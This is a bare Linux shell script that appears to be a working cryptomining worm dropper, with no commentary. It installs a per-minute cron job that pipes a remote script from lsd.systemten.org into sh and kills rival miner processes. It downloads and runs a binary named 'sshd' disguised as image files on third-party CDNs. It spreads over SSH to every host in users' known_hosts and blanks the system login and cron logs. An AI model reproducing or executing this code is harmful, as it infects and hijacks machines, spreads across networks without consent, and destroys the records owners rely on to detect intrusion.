export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin

mkdir -p /tmp
chmod 1777 /tmp

echo "* * * * * (curl -fsSL lsd.systemten.org||wget -q -O- lsd.systemten.org)|sh" | crontab -

ps -ef|grep -v grep|grep hwlh3wlh44lh|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep Circle_MI|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep get.bi-chi.com|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep hashvault.pro|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep nanopool.org|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep /usr/bin/.sshd|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "xmr"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "xig"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "ddgs"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "qW3xT"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "wnTKYg"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "t00ls.ru"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "sustes"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "thisxxs"|awk '{print $2}' | xargs kill -9
ps -ef|grep -v grep|grep "hashfish"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kworkerds"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "/tmp/devtool"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "systemctI"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "sustse"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "axgtbc"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "axgtfa"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "6Tx3Wq"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "dblaunchs"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "/boot/vmlinuz"|awk '{print $2}'|xargs kill -9

cd /tmp
touch /usr/local/bin/writeable && cd /usr/local/bin/
touch /usr/libexec/writeable && cd /usr/libexec/
touch /usr/bin/writeable && cd /usr/bin/
rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable
export PATH=$PATH:$(pwd)
if [ ! -f "/tmp/.XImunix" ] || [ ! -f "/proc/$(cat /tmp/.XImunix)/io" ]; then
    chattr -i sshd
    rm -rf sshd
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]; then
        (curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL img.sobot.com/chatres/89/msg/20190606/35c4e7c12f6e4f7f801acc86af945d9f.png -o sshd||wget --timeout=30 --tries=3 -q img.sobot.com/chatres/89/msg/20190606/35c4e7c12f6e4f7f801acc86af945d9f.png -O sshd||curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL res.cloudinary.com/dqawrdyv5/raw/upload/v1559818933/x64_p0bkci -o sshd||wget --timeout=30 --tries=3 -q res.cloudinary.com/dqawrdyv5/raw/upload/v1559818933/x64_p0bkci -O sshd||curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL cdn.xiaoduoai.com/cvd/dist/fileUpload/1559819210520/7.150351516641309.jpg -o sshd||wget --timeout=30 --tries=3 -q cdn.xiaoduoai.com/cvd/dist/fileUpload/1559819210520/7.150351516641309.jpg -O sshd) && chmod +x sshd
    else
        (curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL img.sobot.com/chatres/89/msg/20190606/5fb4627f8ee14557a34697baf8843dfe.png -o sshd||wget --timeout=30 --tries=3 -q img.sobot.com/chatres/89/msg/20190606/5fb4627f8ee14557a34697baf8843dfe.png -O sshd||curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL res.cloudinary.com/dqawrdyv5/raw/upload/v1559818942/x32_xohyv5 -o sshd||wget --timeout=30 --tries=3 -q res.cloudinary.com/dqawrdyv5/raw/upload/v1559818942/x32_xohyv5 -O sshd||curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL cdn.xiaoduoai.com/cvd/dist/fileUpload/1559819246800/1.8800013111270863.jpg -o sshd||wget --timeout=30 --tries=3 -q cdn.xiaoduoai.com/cvd/dist/fileUpload/1559819246800/1.8800013111270863.jpg -O sshd) && chmod +x sshd
    fi
        $(pwd)/sshd || /usr/bin/sshd || /usr/libexec/sshd || /usr/local/bin/sshd || sshd || ./sshd || /tmp/sshd || /usr/local/sbin/sshd
fi

if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL lsd.systemten.org||wget -q -O- lsd.systemten.org)|sh >/dev/null 2>&1 &' & done
fi

for file in /home/*
do
    if test -d $file
    then
        if [ -f $file/.ssh/known_hosts ] && [ -f $file/.ssh/id_rsa.pub ]; then
            for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL lsd.systemten.org||wget -q -O- lsd.systemten.org)|sh >/dev/null 2>&1 &' & done
        fi
    fi
done

echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
#